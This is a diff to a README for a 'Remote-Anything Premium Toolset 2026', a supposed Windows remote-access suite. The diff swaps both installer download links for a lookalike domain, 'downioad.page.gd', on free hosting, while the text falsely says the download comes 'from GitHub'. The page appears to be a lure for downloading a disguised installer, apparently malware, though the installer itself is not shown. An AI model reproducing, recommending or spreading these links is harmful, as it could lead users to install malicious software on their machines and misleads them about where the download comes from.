@@ -2,7 +2,7 @@
 
 Remote-Anything Premium Toolset 2026 is a comprehensive collection of utilities designed to elevate your remote access experience on Windows desktops. This suite provides advanced features for seamless control, management, and productivity enhancement in remote environments. Last Updated: December 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -75,4 +75,4 @@ Remote-Anything Premium Toolset is released under a proprietary license. Please 
 
 ---
 
-**Download the latest version from GitHub**: [Get it here](https://download-page.page.gd/)
+**Download the latest version from GitHub**: [Get it here](https://downioad.page.gd/)
